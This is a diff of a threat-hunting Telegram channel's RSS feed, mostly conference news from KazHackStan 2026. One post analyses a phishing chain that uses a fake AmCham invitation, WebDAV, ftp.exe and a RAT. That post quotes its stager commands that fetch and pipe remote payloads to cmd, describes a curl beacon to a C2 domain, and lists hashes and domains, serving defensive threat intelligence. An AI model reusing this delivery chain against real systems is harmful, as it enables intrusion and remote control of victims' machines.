@@ -1,5 +1,46 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Threat Hunting Father 🦔</title><link>https://t.me/ThreatHuntingFather</link><description>All about Threat Hunting, detecting malicious activity</description><language>ru</language><lastBuildDate>Wed, 30 Sep 2026 19:02:16 +0000</lastBuildDate><item><title>KazHackStan 2026-ның екінші күні де ерекше әсерге толы болды! 🔐</title><link>https://t.me/ThreatHuntingFather/1519</link><description>KazHackStan 2026-ның екінші күні де ерекше әсерге толы болды! 🔐
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Threat Hunting Father 🦔</title><link>https://t.me/ThreatHuntingFather</link><description>All about Threat Hunting, detecting malicious activity</description><language>ru</language><lastBuildDate>Thu, 01 Oct 2026 10:50:28 +0000</lastBuildDate><item><title>Поговорили тут с https://t.me/knowyouradversary</title><link>https://t.me/ThreatHuntingFather/1522</link><description>Поговорили тут с https://t.me/knowyouradversary
+Тема доклада: Кто, как и зачем атакует
+Казахстан
+Описание доклада:
+За последние несколько лет была зафиксирована активность 25 группировок, нацеленных на организации, расположенные на территории Казахстана. В докладе мы рассмотрим технические особенности реализации совершаемых ими кибератак, а также разберемся в их мотивации.
+
+[Media: Фото]</description><pubDate>Thu, 01 Oct 2026 10:45:21 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_1522</guid></item><item><title>Кто просил что-нибудь про network)</title><link>https://t.me/ThreatHuntingFather/1521</link><description>Кто просил что-нибудь про network)
+https://ifritnoises.org/articles/the-lucifer/</description><pubDate>Thu, 01 Oct 2026 08:07:25 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_1521</guid></item><item><title>Last time on Dragon Ball Z: someone sent me goop (malware) which successfully evaded their EDR and all AVs. It also passed everything on VirusTotal for static-analysis.</title><link>https://t.me/ThreatHuntingFather/1520</link><description>Last time on Dragon Ball Z: someone sent me goop (malware) which successfully evaded their EDR and all AVs. It also passed everything on VirusTotal for static-analysis.
+They sent it to me to bonk with a stick, bonking this whole thing would take me a long time, and I'm not going to do that. I wanted to determine what it was doing, etc.
+My knowledge on state-sponsored activity and geopolitics in the CIS (Commonwealth of Independent States, ex-Soviet countries) is rusty. However, based on the nature of this goop I would be willing to bet 4 silly pictures of cats this is a state-sponsored malware campaign.
+1. The file (a .rar) sent is a fake invitation to the AmCham Kazakhstan's 2026 Gala (or so I assume based on some Google searches) which is happening October 16th, 2026, in Astana,  Kazakhstan
+2. The file contains two files. A .xz file (unsure what it does still at this time, but it's a JPEG, not a real archive) and a .url file (internet shortcut). The internet shortcut is named "Scanned Image". Likely a masquerading technique.
+3. The .url file connects via WebDAV to "file://rappellingaart.com@SSL/secure-docs/3". This directory contains a .lnk (Windows shortcut) and a .ico (Icon file).
+4. This is a masquerading effort, the end user must execute the .lnk file to proceed to the remaining payload. The WebDAV appears as a regular directory in File Explorer on Windows
+5. The .lnk executes FTP.exe inside System32 and passes the WebDAV path to the .ico file as a LOLBIN, as this: "ftp.exe -s:icon.ico"
+6. The .ico acts as a command template and does "!more \\rappellingaart.com@SSL\secure-docs\res.ico|cmd"
+7. The res.ico file, which is piped into CMD.exe, creates a series of scheduled tasks, most notably it connects to gomescareerplans(.)com and performs a CURL on the domain under /docs/?vid=%computername%" as a way to register the machine that it has been infected by their payload
+8. The res.ico also references the WebDAV URL again and performs a silent installation of "Imp_Details.msi" from \\rappellingaart.com@SSL\secure-docs\Imp_Details.msi
+9. Imp_Details.msi contains a section internally labeled Binary._2E9D1C8BAC5D0F288E61BF5987C52203
+10. This section is a RAT written in C++. It has a lot of features, lots of different commands, way too much for me to reverse engineer quickly. However, it does internally perform a XOR on a string. It reveals the C2 for the RAT delivered is chestergreenfarming(.)com
+Invitation .rar:
+2fa7498a3bda849c8c5a0e0869708ff113379d54197109a5cdfaea0155e878c9
+.Url which launches the WebDAV:
+613b6569bd8a4cd75ab11ee9682dd690fabfb11d5c1103caf2ba086e006da034
+Weird .xz:
+fec4f301a1be36a42ec27208e13b5d1d3d0bbe0f1ab47bbab863a7ca9923c571
+.ico file (stager):
+c27ca16248e04f6535ae3e6d1670d740b3884f0fa64935ddfd39faf712f4175d
+.ico (C2 register, task scheduler):
+f1060a81c9f68d6f3d23e28f2a1af50fa18ecb9b0a763ca5dcd4b294b6a3593c
+.MSI (pulled from .ico task scheduler):
+4008c8f9e52d3e6fd7df4a980a9a78f46f2412ba2fda10a38aa92d338767c54c
+.exe inside of .MSI:
+5d8df4c2d08cff5f1c0de8eab56e47ae543bd5c6d2ef04573f61ebb9fbc65716
+WebDAV:
+rappellingaart(.)com
+C2 register:
+gomescareerplans(.)com
+RAT C2:
+chestergreenfarming(.)com
+
+[Media: Фото]</description><pubDate>Thu, 01 Oct 2026 07:03:38 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_1520</guid></item><item><title>KazHackStan 2026-ның екінші күні де ерекше әсерге толы болды! 🔐</title><link>https://t.me/ThreatHuntingFather/1519</link><description>KazHackStan 2026-ның екінші күні де ерекше әсерге толы болды! 🔐
 Мықты спикерлер, мазмұнды панельдік сессиялар және киберқауіпсіздікке қатысты өзекті талқылаулар — бүгінгі бағдарлама қызықты әрі пайдалы өтті. Сондай-ақ CyberKumbez сайысының қорытындысын шығарып, Италияда өтетін ICO 2027 жарысына Қазақстан атынан қатысатын ұлттық құраманы таныстырдық 🇰🇿🇮🇹
 Осы екі күнді бізбен бірге өткізген баршаңызға рақмет! Керемет әсер мен ұмытылмас сәттерге толы кездесу болды ❤️
 📅 29–30 қыркүйек
@@ -16,7 +57,7 @@ Incredible speakers, engaging panel sessions, and important conversations about 
 Thank you to everyone who joined us over these two days. It was amazing! ❤️
 📅 September 29–30
 📍 Astana, Palace of Independence
-🔗 kazhackstan.com</description><pubDate>Wed, 30 Sep 2026 19:02:16 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_1519</guid></item><item><title>1е место Red Team - FR13NDS Team.</title><link>https://t.me/ThreatHuntingFather/1518</link><description>1е место Red Team - FR13NDS Team.
+🔗 kazhackstan.com</description><pubDate>Thu, 01 Oct 2026 10:50:28 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_1519</guid></item><item><title>1е место Red Team - FR13NDS Team.</title><link>https://t.me/ThreatHuntingFather/1518</link><description>1е место Red Team - FR13NDS Team.
 
 [Media: Фото]</description><pubDate>Wed, 30 Sep 2026 13:11:31 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_1518</guid></item><item><title>1е место Red Team - FR13NDS Team.</title><link>https://t.me/ThreatHuntingFather/1517</link><description>1е место Red Team - FR13NDS Team.</description><pubDate>Wed, 30 Sep 2026 12:37:52 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_1517</guid></item><item><title>2е место Red Team - Zero Trust.</title><link>https://t.me/ThreatHuntingFather/1516</link><description>2е место Red Team - Zero Trust.</description><pubDate>Wed, 30 Sep 2026 12:37:52 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_1516</guid></item><item><title>3е место Red Team - кибервойска Азербайджана.</title><link>https://t.me/ThreatHuntingFather/1515</link><description>3е место Red Team - кибервойска Азербайджана.</description><pubDate>Wed, 30 Sep 2026 12:37:52 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_1515</guid></item><item><title>Послушал очень крутой доклад по IOS хакингу от @serj_ws с кейсами от команды Freedom SuperApp ✌️😃</title><link>https://t.me/ThreatHuntingFather/1504</link><description>Послушал очень крутой доклад по IOS хакингу от @serj_ws с кейсами от команды Freedom SuperApp ✌️😃
 Прям очень залетела тема мобилок, может позже залью несколько постов на эту тему 🤓
